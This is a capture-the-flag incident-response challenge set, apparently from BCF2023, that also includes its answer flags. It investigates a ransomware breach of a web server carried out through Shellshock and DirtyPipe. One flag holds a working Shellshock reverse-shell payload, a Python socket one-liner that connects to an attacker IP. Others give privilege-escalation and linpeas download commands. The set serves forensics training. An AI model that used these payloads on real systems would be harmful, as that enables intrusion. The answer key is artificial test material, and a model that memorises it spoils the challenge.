# Catagory: Incident Response


# Problem Name: IR 01: The Attacker
### Point: min 100 max 250 (dynamic)

Recently, the web server of "Frozen Yogurt LTD" fell victim to a cyberattack where an unidentified hacker successfully breached the system. As a result, the hacker managed to encrypt a crucial document stored on the server. To regain access to these valuable files, he is demanding a ransom within a specified timeframe of 15 days.

The administrators have been actively investigating to determine the root cause. Despite their efforts, they have been unable to pinpoint the exact issue. Can you help them to find the root cause and decrypt the file?


Download the [artifact](https://terabox.com/s/1TdaPA9eXCTTTAyh8qqLbDA)  `Password:BCF2023`

N.B. All incident response problems have the same file. 

What is the attacker's IP address?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{x.x.x.x}`

### Max attempts: 10
### flag BCF2023{192.168.0.124}



# Problem Name: IR 02: The Victim
### Point: min 100 max 250 (dynamic)
What is the latest IP address of the server?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{x.x.x.x}`

### Max attempts: 10
### Prerequisite: IR 01
### flag BCF2023{192.168.0.128}



# Problem Name: IR 03: The Weapon
### Point: min 100 max 250 (dynamic)
Initially, the attacker has scanned the server with a tool. Find the tool name and time when the attacker started the attack with this tool (GMT+6 & 24-hour format)


Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{Toolname_DD/MM/YYYY_hh:mm:ss}`

### Max attempts: 5
### Prerequisite: IR 01
### flag BCF2023{Nikto_14/07/2023_16:47:52}





# Problem Name: IR 04: Commands!
### Point: min 150 max 300 (dynamic)
Find the time when the attacker successfully executed the command on the victim server and which binary file is executed on the victim machine. (GMT+6 & 24 hour format)


Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{DD/MM/YYYY_hh:mm:ss.sss,/path/to/binary}`

### Max attempts: 5
### Prerequisite: IR 03
### flag BCF2023{14/07/2023_16:48:46.231,/usr/bin/id}





# Problem Name: IR 05: Access_xD
### Point: min 150 max 300 (dynamic)
Which payload is used by the attacker to get initial successful remote access to the server?
Find full payload.


Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{payload}`
### Hint: Can you access the User-Agent?
### Hint-cost: 50
### Max attempts: 5
### Prerequisite: IR 03
### flag BCF2023{() { :; }; echo ; echo ; /usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.124\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'}





# Problem Name: IR 06: Vulnerability
### Point: min 150 max 300 (dynamic)
What is the specific Vulnerability name of this bug on the server?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{Name}`

### Max attempts: 5
### Prerequisite: IR 05
### flag BCF2023{Shellshock}


# Problem Name: IR 07: CVE!
### Point: min 100 max 250 (dynamic)
What is the CVE ID of this Vulnerability?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{CVE-x-y}`

### Max attempts: 5
### Prerequisite: IR 06
### flags BCF2023{CVE-2014-6278},  BCF2023{CVE-2014-6271}


# Problem Name: IR 08: Proof of compromise
### Point: min 150 max 300 (dynamic)
What was the time and current working directory when Attacker got successfully remote access to the server ? (GMT+6 & 24 hour format),

Author:[Oxf4h1m](https://fb.com/fa11m)


Flag format: `BCF2023{DD/MM/YYYY_hh:mm:ss.sss,/path/to/directory}`

### Max attempts: 5
### Prerequisite: IR 03
### flag BCF2023{14/07/2023_16:52:23.011,/usr/lib/cgi-bin}



# Problem Name: IR 09: Reconnaissance
### Point: min 100 max 250 (dynamic)
After successful access to the server attacker downloaded a script for enumeration purposes. What was the command to download it?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{command}`

### Max attempts: 5
### Prerequisite: IR 08
### flag BCF2023{curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh}



# Problem Name: IR 10: Privesc 1
### Point: min 100 max 250 (dynamic)
After downloading some exploit, the attacker managed to escalate his privileges to root level. The question is, what specific command did they use to achieve this privilege escalation?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{command}`

### Max attempts: 5
### Prerequisite: IR 09
### flag BCF2023{./50808exploit /usr/bin/chsh}


# Problem Name: IR 11: Privesc 2
### Point: min 50 max 100 (dynamic)
What is the CVE and name of this privilege escalation vulnerability?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{CVE-x-y_TheName}`

### Max attempts: 5
### Prerequisite: IR 09
### flag BCF2023{CVE-2022-0847_DirtyPipe}



# Problem Name: IR 12: Privesc 3
### Point: min 100 max 250 (dynamic)
What was the first command of the attacker after successfully escalating his privileges to root?  (GMT+6 & 24 hour format) 

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{DD/MM/YYYY_hh:mm:ss.sss_command}`

### Max attempts: 5
### Prerequisite: IR 11
### flag BCF2023{14/07/2023_17:15:31.480_whoami}


# Problem Name: IR 13: Privesc 4
### Point: min 100 max 250 (dynamic)
The attacker was able to gain a root shell because of the vulnerable kernel. What is the kernel version of the server machine?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{version}`

### Max attempts: 5
### Prerequisite: IR 11
### flag BCF2023{5.13.0-051300-generic}


# Problem Name: IR 14: Ransoms 
### Point: min 100 max 250 (dynamic)
The attacker encrypted a crucial document stored on the server, what was the URL of the encryptor?

Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{url}`

### Max attempts: 5
### Prerequisite: IR 05
### flag BCF2023{https://github.com/nanoshade/SecretSuperTools.git}



# Problem Name: IR 15: Recovery
### Point: 400
The admin said, "I can remember only that the file was 1954 characters long". Can you decrypt the file which was encrypted in `/home/frozen/` directory by the attacker? 


Author:[Oxf4h1m](https://fb.com/fa11m)

Flag format: `BCF2023{flag}`

### Max attempts: 5
### Prerequisite: IR 14
### flag BCF2023{R4nd0m_w17h_f1x3d_533d_15_n07_50_r4nd0m_xD}


